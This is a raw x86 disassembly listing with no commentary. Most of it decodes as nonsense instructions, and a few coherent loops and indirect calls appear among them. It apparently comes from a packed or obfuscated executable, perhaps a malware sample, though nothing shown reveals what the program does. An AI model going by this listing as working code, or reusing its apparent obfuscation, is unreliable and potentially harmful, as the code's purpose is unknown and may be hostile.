  4177be:	add    eax,0x81d1e656
  4177c3:	mov    al,0x32
  4177c5:	stos   DWORD PTR es:[edi],eax
  4177c6:	cmp    dh,al
  4177c8:	jnp    0x417799
  4177ca:	push   ecx
  4177cb:	dec    ebp
  4177cc:	cmp    DWORD PTR [ebx+0x4642ec37],ebx
  4177d2:	inc    esp
  4177d3:	popf   
  4177d4:	push   esp
  4177d5:	add    edx,esi
  4177d7:	aam    0x83
  4177d9:	xchg   ebp,eax
  4177da:	shl    BYTE PTR [ebp+0x3b1d41bf],0xe6
  4177e1:	into   
  4177e2:	mov    ?,WORD PTR [edx+0x29]
  4177e5:	sub    BYTE PTR [ecx-0x8],dh
  4177e8:	push   ebx
  4177e9:	scas   eax,DWORD PTR es:[edi]
  4177ea:	js     0x417866
  4177ec:	sbb    eax,0x92885a13
  4177f1:	pop    ecx
  4177f2:	int3   
  4177f3:	and    esi,ecx
  4177f5:	jp     0x41780b
  4177f7:	jno    0x41777d
  4177f9:	push   ebp
  4177fa:	stos   DWORD PTR es:[edi],eax
  4177fb:	mov    WORD PTR [ebp-0x62],ds
  4177fe:	sub    al,0xf3
  417800:	sbb    eax,0x6c9a16ae
  417805:	rol    DWORD PTR [ebx],cl
  417807:	sub    DWORD PTR [ecx-0x45],ecx
  41780a:	les    edi,FWORD PTR [esi]
  41780c:	test   BYTE PTR [ebx-0x535b42b7],ah
  417812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417813:	das    
  417814:	sar    bl,0xf6
  417817:	adc    eax,DWORD PTR [edi+0x7419fd91]
  41781d:	push   0xffffffbe
  41781f:	mov    dl,0x11
  417821:	or     esi,DWORD PTR [ecx-0x6a]
  417824:	(bad)  
  417825:	fistp  DWORD PTR [edx]
  417827:	out    dx,eax
  417828:	stc    
  417829:	push   edx
  41782a:	inc    edx
  41782b:	test   BYTE PTR [ebp+ebp*8-0x51],0x5e
  417830:	rol    BYTE PTR [esi+edx*4+0x7b],1
  417834:	jo     0x41781c
  417836:	inc    esp
  417837:	push   ebp
  417838:	ficom  WORD PTR [esi]
  41783a:	retf   
  41783b:	adc    esi,DWORD PTR [eax+0xd]
  41783e:	call   0x43348ec5
  417843:	scas   eax,DWORD PTR es:[edi]
  417844:	leave  
  417845:	xchg   ecx,eax
  417846:	add    al,0xa5
  417848:	fiadd  DWORD PTR [edx-0x49d244dc]
  41784e:	jns    0x41788f
  417850:	dec    ebx
  417851:	sub    BYTE PTR [esi],0x3d
  417854:	fisub  WORD PTR [ecx-0x11]
  417857:	and    eax,0xf4aba323
  41785c:	xor    eax,0xb9cdf085
  417861:	xor    BYTE PTR [ebx+0x7e],dl
  417864:	int3   
  417865:	cmp    al,0xee
  417867:	xor    eax,0x4ababa3
  41786c:	loopne 0x4178c1
  41786e:	fidivr DWORD PTR [eax-0x42]
  417871:	cld    
  417872:	or     al,0xe
  417874:	add    DWORD PTR [eax+0x6e633cfe],edi
  41787a:	sahf   
  41787b:	mov    ds:0xf8854dd,eax
  417880:	lods   al,BYTE PTR ds:[esi]
  417881:	das    
  417882:	push   ebx
  417883:	sti    
  417884:	and    al,0x9a
  417886:	mov    eax,0x2f0fc330
  41788b:	cmp    edx,ecx
  41788d:	adc    ebp,eax
  41788f:	xchg   ecx,eax
  417890:	pop    ebx
  417891:	fdiv   QWORD PTR [ebx+0x1a]
  417894:	(bad)  
  417895:	xchg   edi,eax
  417896:	push   es
  417897:	pop    es
  417898:	xchg   BYTE PTR [ebp+0x5dbb2154],cl
  41789e:	rol    dl,0xe4
  4178a1:	imul   ebx,edi,0xffffff8a
  4178a4:	push   0x2a
  4178a6:	fdiv   DWORD PTR [esi-0x32a1a159]
  4178ac:	dec    esp
  4178ad:	xor    edx,ebx
  4178af:	mov    bh,bl
  4178b1:	push   edx
  4178b2:	or     BYTE PTR [ecx],cl
  4178b4:	test   BYTE PTR [ebx+eiz*1],cl
  4178b7:	add    BYTE PTR [ecx+0x19],bh
  4178ba:	fninit 
  4178bc:	stc    
  4178bd:	add    DWORD PTR [ebx],edx
  4178bf:	and    DWORD PTR [esi-0x2bfdf9e],esi
  4178c5:	mov    ecx,0x87207449
  4178ca:	je     0x4178f9
  4178cc:	cwde   
  4178cd:	jle    0x4178f6
  4178cf:	jo     0x417937
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	jge    0x4178f6
  4178e7:	push   ss
  4178e8:	leave  
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0x6078787e
  4178f2:	or     ebx,edx
  4178f4:	push   edi
  4178f5:	xlat   BYTE PTR ds:[ebx]
  4178f6:	dec    edi
  4178f7:	add    al,0x73
  4178f9:	push   eax
  4178fa:	hlt    
  4178fb:	mov    ch,0x1d
  4178fd:	lea    edi,ds:0x48c1af04
  417903:	nop
  417904:	out    dx,al
  417905:	sub    esp,edi
  417907:	lods   eax,DWORD PTR ds:[esi]
  417908:	dec    ecx
  417909:	sbb    al,bh
  41790b:	iret   
  41790c:	int3   
  41790d:	gs out dx,eax
  41790f:	fndisi(8087 only) 
  417911:	cmp    BYTE PTR [eax-0x277c1741],al
  417917:	cld    
  417918:	push   edi
  417919:	fwait
  41791a:	(bad)  
  41791b:	loope  0x4178de
  41791d:	jae    0x417962
  41791f:	popa   
  417920:	sbb    edx,DWORD PTR [ebp-0xe]
  417923:	retf   
  417924:	data16 rcl BYTE PTR [esi+0x5602b13a],cl
  41792b:	out    dx,al
  41792c:	cli    
  41792d:	(bad)  
  41792e:	(bad)  
  41792f:	sbb    DWORD PTR [edi],esp
  417931:	mov    dh,0xbc
  417933:	push   esp
  417934:	enter  0x2ab3,0x8c
  417938:	pop    ebx
  417939:	shr    BYTE PTR [esi+0x7a],1
  41793c:	add    eax,0x73bfef5d
  417941:	jb     0x41794b
  417943:	sbb    edx,esp
  417945:	inc    ecx
  417946:	(bad)  
  417947:	jg     0x417965
  417949:	mov    ?,eax
  41794b:	popa   
  41794c:	push   esp
  41794d:	int    0xc3
  41794f:	add    BYTE PTR [eax+0x33dad3ca],dl
  417955:	test   BYTE PTR [edx-0x49026b94],bl
  41795b:	cmp    ebp,ebx
  41795d:	jle    0x41793f
  41795f:	iret   
  417960:	sub    al,bh
  417962:	stos   DWORD PTR es:[edi],eax
  417963:	cmp    esi,DWORD PTR [esi]
  417965:	ret    
  417966:	jp     0x4179bd
  417968:	add    cl,BYTE PTR [ecx-0x40]
  41796b:	ret    
  41796c:	sahf   
  41796d:	cld    
  41796e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41796f:	rcr    DWORD PTR [edx],0x8f
  417972:	xchg   DWORD PTR [ecx-0x26],edi
  417975:	mov    ebx,0x9427edcd
  41797a:	clc    
  41797b:	cs je  0x4179f3
  41797e:	rcl    BYTE PTR [ebx],cl
  417980:	inc    edx
  417981:	ret    
  417982:	retf   0x6c71
  417985:	sbb    ebx,DWORD PTR [ebx-0x611754af]
  41798b:	hlt    
  41798c:	and    BYTE PTR ds:[edi-0xde80db9],ah
  417993:	xlat   BYTE PTR ds:[ebx]
  417994:	neg    BYTE PTR fs:[eax+0x35]
  417998:	pop    ss
  417999:	push   0xffffffdf
  41799b:	xor    eax,0x56e8464b
  4179a0:	arpl   bx,bx
  4179a2:	ds dec ebp
  4179a4:	adc    BYTE PTR [ecx-0x2919ee19],0xf1
  4179ab:	sbb    DWORD PTR [ecx],0xc585fdb2
  4179b1:	adc    eax,0xbf4dba41
  4179b6:	jae    0x417945
  4179b8:	mov    WORD PTR [esi],es
  4179ba:	cld    
  4179bb:	(bad)  
  4179bc:	add    al,0xa
  4179be:	sub    ecx,DWORD PTR [ebp+0x1b]
  4179c1:	stos   DWORD PTR es:[edi],eax
  4179c2:	sub    dh,BYTE PTR [edx+0x5c]
  4179c5:	cli    
  4179c6:	rol    DWORD PTR [esi+ebp*2],0x79
  4179ca:	adc    eax,0x245c5377
  4179cf:	loope  0x417998
  4179d1:	cld    
  4179d2:	push   ecx
  4179d3:	in     al,dx
  4179d4:	sahf   
  4179d5:	jo     0x417966
  4179d7:	ret    
  4179d8:	push   ebx
  4179d9:	add    dl,BYTE PTR [eax+0x9]
  4179dc:	test   al,0x58
  4179de:	loop   0x4179e9
  4179e0:	mov    cl,0x37
  4179e2:	(bad)  
  4179e3:	int3   
  4179e4:	mov    bh,0x9d
  4179e6:	lods   eax,DWORD PTR ds:[esi]
  4179e7:	imul   ebp,DWORD PTR [ecx+0x3a],0xf38082c3
  4179ee:	mov    cs,WORD PTR [ebx-0x6c4a00e]
  4179f4:	popa   
  4179f5:	cmp    DWORD PTR [esi-0x59],0x56cb0b4a
  4179fc:	sub    eax,0xb835a2ed
  417a01:	and    al,0x74
  417a03:	push   ds
  417a04:	aas    
  417a05:	mov    al,ds:0x38c4e528
  417a0a:	cmp    eax,0x34cf6fa7
  417a0f:	pop    es
  417a10:	mov    edi,DWORD PTR [edx+0x59]
  417a13:	push   cs
  417a14:	in     al,dx
  417a15:	test   BYTE PTR [edx+0x190b3ab],0xb2
  417a1c:	bound  eax,QWORD PTR [edx+0x2c315523]
  417a22:	or     eax,0xb576690f
  417a27:	mov    ecx,esp
  417a29:	rcr    DWORD PTR [edx],cl
  417a2b:	push   esi
  417a2c:	aas    
  417a2d:	inc    ebx
  417a2e:	rcr    BYTE PTR [edx+eiz*1-0x34f4381],1
  417a35:	add    eax,0x247a6c48
  417a3a:	jbe    0x4179d8
  417a3c:	cmp    eax,0x760a4209
  417a41:	cbw    
  417a43:	push   esi
  417a44:	push   es
  417a45:	mov    gs,WORD PTR [ebp+0x6a]
  417a48:	xchg   esi,eax
  417a49:	in     al,dx
  417a4a:	dec    eax
  417a4b:	rol    BYTE PTR [edi-0x10334c5a],1
  417a51:	add    esp,DWORD PTR [esi+0x1eae27e6]
  417a57:	or     eax,0xf0c153f1
  417a5c:	loope  0x417a1f
  417a5e:	pop    ecx
  417a5f:	sahf   
  417a60:	(bad)
  417a63:	cmp    BYTE PTR [eax+0x4e],bh
  417a66:	aad    0x3
  417a68:	fldcw  WORD PTR [ebx]
  417a6a:	inc    BYTE PTR [edx]
  417a6c:	jp     0x417a07
  417a6e:	cmp    eax,0x28e62ab0
  417a73:	enter  0x9346,0xd2
  417a77:	dec    esp
  417a78:	sbb    eax,0x577bba3b
  417a7d:	sar    DWORD PTR ds:0x8df5b418,cl
  417a83:	mov    edi,0x3f982852
  417a88:	or     esi,DWORD PTR [ebp-0x3c2cb2c9]
  417a8e:	cwde   
  417a8f:	pushf  
  417a90:	ds int3 
  417a92:	lds    ebp,FWORD PTR [esi+0x14]
  417a95:	cld    
  417a96:	add    DWORD PTR [edx-0x40cb7d0e],ecx
  417a9c:	sbb    BYTE PTR [eax+0x3aaa7107],0x62
  417aa3:	pushf  
  417aa4:	stos   BYTE PTR es:[edi],al
  417aa5:	mov    ds:0xd343c07a,al
  417aaa:	enter  0xca05,0xde
  417aae:	sub    DWORD PTR [ebx-0x2b],0xb
  417ab2:	or     ch,al
  417ab4:	icebp  
  417ab5:	pop    esp
  417ab6:	ss jecxz 0x417ade
  417ab9:	dec    edx
  417aba:	sbb    edi,DWORD PTR [ecx]
  417abc:	scas   eax,DWORD PTR es:[edi]
  417abd:	stos   BYTE PTR es:[edi],al
  417abe:	xchg   edi,eax
  417abf:	pop    ecx
  417ac0:	push   eax
  417ac1:	fs pusha 
  417ac3:	adc    edx,ebx
  417ac5:	dec    edi
  417ac6:	das    
  417ac7:	(bad)  
  417ac9:	imul   ebp,DWORD PTR [ecx],0xa55750df
  417acf:	adc    BYTE PTR [ebp+0x7d],ah
  417ad2:	add    BYTE PTR [edi-0x2a],bh
  417ad5:	mul    DWORD PTR [eax-0x136a8b69]
  417adb:	xor    DWORD PTR [esp+esi*1-0x19156b3d],ebp
  417ae2:	xchg   edi,eax
  417ae3:	int3   
  417ae4:	int    0x13
  417ae6:	push   eax
  417ae7:	ffree  st(6)
  417ae9:	jmp    0x417a6d
  417aeb:	and    esp,DWORD PTR [ebp+0x69]
  417aee:	or     eax,DWORD PTR [edx-0x6dd46d32]
  417af4:	xchg   ebx,eax
  417af5:	inc    edi
  417af6:	scas   al,BYTE PTR es:[edi]
  417af7:	sub    BYTE PTR [edi-0x4554876c],0x50
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x2b31366c
  417b49:	mov    dl,0x11
  417b4b:	xor    DWORD PTR [edi+0x78],edi
  417b4e:	add    eax,0x3e78787e
  417b53:	mov    eax,0x94c9123e
  417b58:	in     al,0x99
  417b5a:	add    DWORD PTR [esi-0x28bb0bd3],esi
  417b60:	xlat   BYTE PTR ds:[ebx]
  417b61:	add    ah,ah
  417b63:	repnz loop 0x417b0f
  417b66:	pop    ebp
  417b67:	aas    
  417b68:	pushf  
  417b69:	cmc    
  417b6a:	sub    BYTE PTR [esi-0x2e865fc3],ch
  417b70:	sbb    cl,bh
  417b72:	push   0xadec0e95
  417b77:	jbe    0x417bc8
  417b79:	(bad)  
  417b7a:	es push ebx
  417b7c:	cmp    BYTE PTR [esi-0x18],cl
  417b7f:	aaa    
  417b80:	push   eax
  417b81:	std    
  417b82:	and    BYTE PTR [ebx],cl
  417b84:	dec    eax
  417b85:	and    edi,DWORD PTR [eax-0x6d]
  417b88:	fnstcw WORD PTR [ebp+0x6ed3e73b]
  417b8e:	repz pop es
  417b90:	loope  0x417bfb
  417b92:	adc    BYTE PTR [eax+ecx*1],dh
  417b95:	adc    DWORD PTR ds:0x3943c05e,esi
  417b9b:	arpl   WORD PTR [ebx],ax
  417b9d:	add    esi,DWORD PTR [ebx+0x6b]
  417ba0:	or     bl,BYTE PTR [eax+0x5afbaf72]
  417ba6:	and    esi,DWORD PTR [eax]
  417ba8:	xchg   ecx,eax
  417ba9:	nop
  417baa:	adc    DWORD PTR [esi-0x4a],0x4a
  417bae:	add    bl,BYTE PTR ds:0x67e0eeda
  417bb4:	dec    edx
  417bb5:	in     al,dx
  417bb6:	jmp    0x19adc49e
  417bbb:	jne    0x417b4b
  417bbd:	or     al,0x96
  417bbf:	retf   
  417bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bc1:	xor    ecx,ebp
  417bc3:	push   ecx
  417bc4:	xlat   BYTE PTR ds:[ebx]
  417bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bc6:	repz call 0x859c:0x5aa4c12
  417bce:	mov    ch,0x4e
  417bd0:	sbb    DWORD PTR [eax+ebx*2+0x5b],0x5b54c47b
  417bd8:	jmp    0x417c0d
  417bda:	adc    bh,BYTE PTR [ebx+0x51]
  417bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bde:	mov    ecx,0xdbb55617
  417be3:	mov    esp,0xa4fdb5e6
  417be8:	add    al,0x59
  417bea:	adc    BYTE PTR [edi+0x4c],cl
  417bed:	mov    edi,0x8ed9062a
  417bf2:	outs   dx,BYTE PTR ds:[esi]
  417bf3:	jecxz  0x417bf5
  417bf5:	repnz or BYTE PTR [esi-0x748b21a],0xee
  417bfd:	mov    edi,0x9a939ebb
  417c02:	ror    bh,cl
  417c04:	out    dx,eax
  417c05:	stos   BYTE PTR es:[edi],al
  417c06:	mov    bl,BYTE PTR [edi-0x7b]
  417c09:	int3   
  417c0a:	adc    ecx,edx
  417c0c:	xor    al,0x1b
  417c0e:	mov    al,ds:0x15552bfb
  417c13:	js     0x417bff
  417c15:	sbb    BYTE PTR [esi+edi*4-0x272b538a],bh
  417c1c:	addr16 inc eax
  417c1e:	pop    ss
  417c1f:	jp     0x417bc5
  417c21:	je     0x417c6c
  417c23:	scas   al,BYTE PTR es:[edi]
  417c24:	pop    edx
  417c25:	xchg   edx,eax
  417c26:	inc    esp
  417c27:	sub    DWORD PTR [edx+edi*2-0x1e],edi
  417c2b:	ret    
  417c2c:	inc    esi
  417c2d:	sbb    bl,dh
  417c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c30:	sbb    al,0x65
  417c32:	and    edx,DWORD PTR [ebx+0x37]
  417c35:	adc    bl,BYTE PTR [ebx+0x6a]
  417c38:	mov    bl,0xd6
  417c3a:	mov    ebp,0x623c324e
  417c3f:	cmp    bh,BYTE PTR [ebx-0x54]
  417c42:	mov    edi,0x36f01f95
  417c47:	rcr    BYTE PTR [edi-0x3a],0x60
  417c4b:	mov    eax,ds:0x761d8c73
  417c50:	stos   DWORD PTR es:[edi],eax
  417c51:	push   ecx
  417c52:	pop    ss
  417c53:	or     dl,BYTE PTR [ebx-0xb]
  417c56:	xchg   BYTE PTR [edi+0x5f3184fa],ch
  417c5c:	call   0x2dbc:0x40572266
  417c63:	rol    bh,0x24
  417c66:	out    0xc5,al
  417c68:	sti    
  417c69:	cmc    
  417c6a:	leave  
  417c6b:	test   al,0x49
  417c6d:	pushf  
  417c6e:	inc    ebp
  417c6f:	shr    DWORD PTR [esi],cl
  417c71:	push   esi
  417c72:	sbb    DWORD PTR [edx+ebp*2],ebx
  417c75:	stc    
  417c76:	mov    ds:0x7a0c5a8b,al
  417c7b:	xchg   edx,eax
  417c7c:	cmp    al,0x84
  417c7e:	push   ebp
  417c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c80:	mov    edi,0x26e87ff6
  417c85:	pop    ebx
  417c86:	test   eax,0x674a30cd
  417c8b:	ret    0xe615
  417c8e:	lock or al,0x4b
  417c91:	push   esi
  417c92:	icebp  
  417c93:	lods   eax,DWORD PTR ds:[esi]
  417c94:	repnz enter 0x9760,0xdd
  417c99:	ret    0xe323
  417c9c:	out    dx,eax
  417c9d:	jg     0x417d04
  417c9f:	jmp    0x1b68:0x63ab7f7
  417ca6:	mov    dl,0x55
  417ca8:	imul   esi,DWORD PTR [edx-0x46938669],0xa8cd939
  417cb2:	in     eax,0x47
  417cb4:	mov    ebp,0x31592284
  417cb9:	push   edi
  417cba:	popf   
  417cbb:	pop    esi
  417cbc:	dec    esp
  417cbd:	cmp    BYTE PTR [ebx-0x23],ah
  417cc0:	(bad)
  417cc3:	push   0x70
  417cc5:	arpl   bx,cx
  417cc7:	sbb    DWORD PTR [ecx],eax
  417cc9:	push   esi
  417cca:	dec    esp
  417ccb:	ja     0x417c80
  417ccd:	inc    esp
  417cce:	imul   edi,DWORD PTR [ecx-0x3d],0xfc6ff811
  417cd5:	sub    ecx,DWORD PTR [ecx-0x29]
  417cd8:	cmp    edx,esp
  417cda:	cmp    eax,0xe0c71d44
  417cdf:	cmp    DWORD PTR [ebx],ecx
  417ce1:	inc    esp
  417ce2:	xchg   BYTE PTR [eax+0x55fdbb06],dh
  417ce8:	fistp  WORD PTR [eax]
  417cea:	hlt    
  417ceb:	into   
  417cec:	and    bh,BYTE PTR [esi]
  417cee:	data16 xor al,0x4d
  417cf1:	ja     0x417cd9
  417cf3:	fsubr  st(4),st
  417cf5:	popf   
  417cf6:	imul   esi,DWORD PTR [edx-0x44],0xffffff9a
  417cfa:	add    al,0x7
  417cfc:	mov    ecx,0xa303c402
  417d01:	sar    BYTE PTR [edx-0x620dcc77],0xd5
  417d08:	sar    esi,0x10
  417d0b:	test   al,0x5b
  417d0d:	jle    0x417d61
  417d0f:	cmp    BYTE PTR [edi+0xd],0x31
  417d13:	add    esi,ebx
  417d15:	rol    BYTE PTR [edi+0x1d931132],0x19
  417d1c:	mov    ecx,0xeac00645
  417d21:	in     eax,dx
  417d22:	sub    al,0xdd
  417d24:	push   0x8a450402
  417d29:	dec    edi
  417d2a:	push   cs
  417d2b:	adc    DWORD PTR [ebx],esi
  417d2d:	pop    ebx
  417d2e:	jns    0x417d3d
  417d30:	dec    ebx
  417d31:	cmp    dl,bh
  417d33:	mov    dh,0x48
  417d35:	add    edi,DWORD PTR [eax+0x1d]
  417d38:	jnp    0x417d0c
  417d3a:	(bad)  
  417d3b:	sar    ebp,cl
  417d3d:	mov    BYTE PTR [eax-0x43],ch
  417d40:	dec    ebx
  417d41:	stos   BYTE PTR es:[edi],al
  417d42:	pusha  
  417d43:	gs inc ebx
  417d45:	push   0xffffffe1
  417d47:	inc    ebp
  417d48:	and    bh,dh
  417d4a:	mov    dl,0xe3
  417d4c:	test   DWORD PTR es:[edx-0x41a335ba],esi
  417d53:	ss mov edi,0x1813dfa0
  417d59:	mov    edx,0x358b6107
  417d5e:	push   eax
  417d5f:	or     BYTE PTR [ecx+0x7],dl
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	cmp    edi,DWORD PTR [ecx+0x14]
  417e90:	std    
  417e91:	push   ds
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	sti    
  417e9a:	sub    dh,bl
  417e9c:	push   0xf96b61b5
  417ea1:	jecxz  0x417e41
  417ea3:	jae    0x417ea4
  417ea5:	sub    al,al
  417ea7:	in     al,0x29
  417ea9:	sahf   
  417eaa:	mov    al,ds:0x7435bfc8
  417eaf:	scas   al,BYTE PTR es:[edi]
  417eb0:	push   ecx
  417eb1:	xchg   ecx,eax
  417eb2:	sub    al,0x9d
  417eb4:	push   ebx
  417eb5:	add    ebp,DWORD PTR [ecx+esi*2+0x77e20b4e]
  417ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebd:	adc    edx,DWORD PTR [edi+0x5602b179]
  417ec3:	mov    ss:0x4565b37f,al
  417ec9:	leave  
  417eca:	or     ecx,0x76
  417ecd:	retf   0x55e0
  417ed0:	imul   edx,DWORD PTR [ecx-0x47f7b201],0xffffffb4
  417ed7:	imul   esp,DWORD PTR [eax-0x1ad97739],0x23a81fba
  417ee1:	loope  0x417ea3
  417ee3:	push   edx
  417ee4:	add    al,0xc7
  417ee6:	loopne 0x417e7e
  417ee8:	shl    BYTE PTR [ecx+0x24],0x41
  417eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eed:	out    dx,eax
  417eee:	mov    ebx,DWORD PTR [edi]
  417ef0:	retf   0xb930
  417ef3:	(bad)  
  417ef4:	mov    edx,0x8a3a7538
  417ef9:	fsub   st(6),st
  417efb:	pusha  
  417efc:	dec    ebp
  417efd:	mov    al,0x5f
  417eff:	cmc    
  417f00:	repz (bad) 
  417f02:	cmp    esp,DWORD PTR [ecx]
  417f04:	rol    BYTE PTR [ebp-0x1f07f689],cl
  417f0a:	(bad)  
  417f0b:	add    al,0x66
  417f0d:	dec    BYTE PTR [edx-0x57cc7314]
  417f13:	out    dx,eax
  417f14:	xor    eax,0x1bee5b37
  417f19:	in     al,dx
  417f1a:	sub    DWORD PTR [ecx-0x6923b1e3],ebx
  417f20:	cmc    
  417f21:	sbb    bh,BYTE PTR [ecx]
  417f23:	dec    esi
  417f24:	push   ss
  417f25:	in     eax,0x7
  417f27:	mov    al,0x23
  417f29:	inc    ebp
  417f2a:	adc    eax,0x457674c
  417f2f:	icebp  
  417f30:	mov    ds:0x19fa0a58,al
  417f35:	xchg   edi,eax
  417f36:	out    dx,al
  417f37:	xchg   DWORD PTR [ecx],esp
  417f39:	iret   
  417f3a:	mov    esp,0x37225461
  417f3f:	pop    ds
  417f40:	fdiv   st,st(5)
  417f42:	out    dx,al
  417f43:	cwde   
  417f44:	push   edx
  417f45:	out    0xb5,al
  417f47:	cmp    BYTE PTR [eax+0x53],dl
  417f4a:	call   0x66430d4
  417f4f:	inc    eax
  417f50:	cli    
  417f51:	mov    BYTE PTR [ecx],0x98
  417f54:	sbb    ebx,ebp
  417f56:	mov    cl,BYTE PTR [edx+esi*8]
  417f59:	add    eax,0xca947221
  417f5e:	aam    0xad
  417f60:	mov    bh,0xfd
  417f62:	outs   dx,BYTE PTR ds:[esi]
  417f63:	ins    BYTE PTR es:[edi],dx
  417f64:	push   esp
  417f65:	scas   eax,DWORD PTR es:[edi]
  417f66:	(bad)  [esi+esi*2+0x35]
  417f6a:	inc    ebp
  417f6b:	int    0x97
  417f6d:	add    eax,0xf46d36fb
  417f72:	pop    ss
  417f73:	in     eax,0x89
  417f75:	jge    0x417fa8
  417f77:	(bad)  
  417f78:	jg     0x417fcd
  417f7a:	push   ecx
  417f7b:	mov    cl,0xf
  417f7d:	push   edx
  417f7e:	push   es
  417f7f:	sub    ebx,edi
  417f81:	mov    DWORD PTR [eax+0x49],eax
  417f84:	inc    ebx
  417f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f86:	xchg   ecx,eax
  417f87:	inc    esp
  417f88:	sbb    ah,BYTE PTR [ebx-0x22dabf3d]
  417f8e:	lock xchg ebp,ebx
  417f91:	ret    
  417f92:	push   ss
  417f93:	jecxz  0x417f8e
  417f95:	je     0x417fd3
  417f97:	popa   
  417f98:	jmp    0x417f21
  417f9a:	mov    ch,0x36
  417f9c:	into   
  417f9d:	mov    ?,WORD PTR [esi-0x6ab0bf03]
  417fa3:	retf   0x7181
  417fa6:	fcomp  st(1)
  417fa8:	(bad)  
  417fa9:	cmp    eax,0x2788cfb1
  417fae:	push   esp
  417faf:	dec    edx
  417fb0:	adc    eax,0xc05a166d
  417fb5:	dec    ebx
  417fb6:	pop    ebx
  417fb7:	sahf   
  417fb8:	jo     0x418006
  417fba:	pop    ss
  417fbb:	in     eax,dx
  417fbc:	mov    ch,0x89
  417fbe:	outs   dx,DWORD PTR ds:[esi]
  417fbf:	xchg   esi,eax
  417fc0:	scas   eax,DWORD PTR es:[edi]
  417fc1:	(bad)  
  417fc2:	lock pop ecx
  417fc4:	sub    bh,BYTE PTR [edi+0xc]
  417fc7:	push   0xffffffde
  417fc9:	push   0x3cf505c3
  417fce:	mov    eax,0xce308f46
  417fd3:	pop    ss
  417fd4:	dec    edi
  417fd5:	(bad)  
  417fd6:	and    dh,BYTE PTR [edx-0x588e65d2]
  417fdc:	aad    0x11
  417fde:	lahf   
  417fdf:	sar    ecx,cl
  417fe1:	adc    eax,0x97311fd0
  417fe6:	mov    dh,0x8
  417fe8:	lods   al,BYTE PTR ds:[esi]
  417fe9:	test   ebp,ebx
  417feb:	or     ecx,DWORD PTR [eax-0x66cf50b2]
